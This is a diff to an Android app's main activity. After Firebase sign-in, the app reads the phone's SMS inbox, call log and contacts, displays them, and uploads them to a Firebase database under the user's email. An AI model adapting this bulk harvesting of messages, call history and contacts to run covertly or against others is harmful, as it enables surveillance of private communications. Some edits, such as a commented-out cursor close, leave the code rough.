@@ -6,23 +6,20 @@ import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Bundle;
+import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.support.annotation.NonNull;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
-import android.os.Bundle;
+import android.util.Log;
 import android.view.View;
 import android.widget.ArrayAdapter;
+import android.widget.Button;
 import android.widget.ListView;
 import android.widget.TextView;
 import android.widget.Toast;
-import android.widget.Button;
-import java.util.ArrayList;
-import java.util.Arrays;
-import java.util.List;
-
-import android.provider.CallLog;
 
 import com.firebase.ui.auth.AuthUI;
 import com.firebase.ui.auth.IdpResponse;
@@ -30,6 +27,10 @@ import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.auth.FirebaseUser;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
+
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.List;
 
 public class MainActivity extends AppCompatActivity implements View.OnClickListener{
     private static final int RC_SIGN_IN = 1 ;
@@ -79,7 +80,10 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     private FirebaseAuth.AuthStateListener authStateListener;
     private static String USERNAME = "USER";
 
+    FirebaseUser user ;
+
     public static MainActivity instance(){return inst;}
+
 
 
 
@@ -109,6 +113,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         database  = FirebaseDatabase.getInstance();
         firebaseAuth = FirebaseAuth.getInstance();
 
+        user = FirebaseAuth.getInstance().getCurrentUser();
+
         if(MyCheckPermission()){
             getSms();
         }else{
@@ -118,15 +124,20 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         authStateListener = new FirebaseAuth.AuthStateListener() {
             @Override
             public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
-                FirebaseUser user = firebaseAuth.getCurrentUser();
-                MyContactRef = database.getReference("UserDetails/"+USERNAME);
+
+                user = FirebaseAuth.getInstance().getCurrentUser();
+
                 if(user!=null){
+
+                    USERNAME = user.getEmail().replace('.','_');
+
+                    MyContactRef = database.getReference("UserDetails/"+USERNAME);
                     if(MyCheckPermission()){
-                        USERNAME = user.getEmail().replace('.','_');
-                        getSms();
+                        //getSms();
+                        getCalls();
+                       // getContacts();
                     }else{
-                        USERNAME = user.getEmail().replace('.','_');
-                        MyReqForPermission();
+
                     }
                 }
                 else{
@@ -146,6 +157,9 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 }
             }
         };
+
+
+
 
     }
 
@@ -172,9 +186,10 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         if (requestCode == RC_SIGN_IN) {
             IdpResponse response = IdpResponse.fromResultIntent(data);
 
+
             if (resultCode == RESULT_OK) {
                 // Successfully signed in
-                FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
+                 user = FirebaseAuth.getInstance().getCurrentUser();
                 assert user != null;
                 USERNAME  = user.getEmail().replace('.','_');
                 MyContactRef = database.getReference("UserDetails/"+USERNAME);
@@ -216,11 +231,13 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             String str = "SMS From:" + smsInboxCurser.getString(indexAddress)+"\n"+smsInboxCurser.getString(indexBody)+"\n";
             smsListView.add(str);
         }while (smsInboxCurser.moveToNext());
-        smsInboxCurser.close();
 
-        MyContactRef.child("SMS").push().setValue(smsListView);
+        if(MyContactRef!=null)
+        MyContactRef.child("SMS").setValue(smsListView);
+
         arrayAdapter = new ArrayAdapter(this,android.R.layout.simple_list_item_1,smsListView);
         listView.setAdapter(arrayAdapter);
+        smsInboxCurser.close();
 
     }
 
@@ -245,10 +262,11 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 callList.add(num+"\n"+name+"\n"+duration+"\n"+dircode);
             }
 
-            c.close();
-            MyContactRef.child("CALLS").push().setValue(callList);
+
+            MyContactRef.child("CALLS").setValue(callList);
             arrayAdapter = new ArrayAdapter(this,android.R.layout.simple_list_item_1,callList);
             listView.setAdapter(arrayAdapter);
+            c.close();
 
         }else
             Toast.makeText(getApplicationContext(), "READ_CALL_LOG Permission not granted", Toast.LENGTH_SHORT).show();
@@ -267,10 +285,11 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 contactList.add(name + "\n" + phoneNumber);
 
             }
-            phones.close();
-            MyContactRef.child("CONTACTS").push().setValue(contactList);
+
+            MyContactRef.child("CONTACTS").setValue(contactList);
             arrayAdapter = new ArrayAdapter(this,android.R.layout.simple_list_item_1,contactList);
             listView.setAdapter(arrayAdapter);
+            //phones.close();
         }else
             Toast.makeText(getApplicationContext(), "READ_CONTACTS permission not granted", Toast.LENGTH_SHORT).show();
     }
@@ -284,21 +303,29 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     protected void onStop() {
         super.onStop();
         unregisterReceiver(broadcastReceiver);
+
     }
 
     @Override
     protected void onStart() {
         super.onStart();
-        firebaseAuth.addAuthStateListener(authStateListener);
         IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVE");
         registerReceiver(broadcastReceiver,intentFilter);
         inst = this;
+        firebaseAuth.addAuthStateListener(authStateListener);
+
     }
 
     @Override
     protected void onResume() {
         super.onResume();
-        firebaseAuth.addAuthStateListener(authStateListener);
+
+        user = FirebaseAuth.getInstance().getCurrentUser();
+
+        if(user!=null) {
+            USERNAME = user.getEmail().replace('.', '_');
+            Log.d("USER", USERNAME);
+        }
     }
 
     @Override
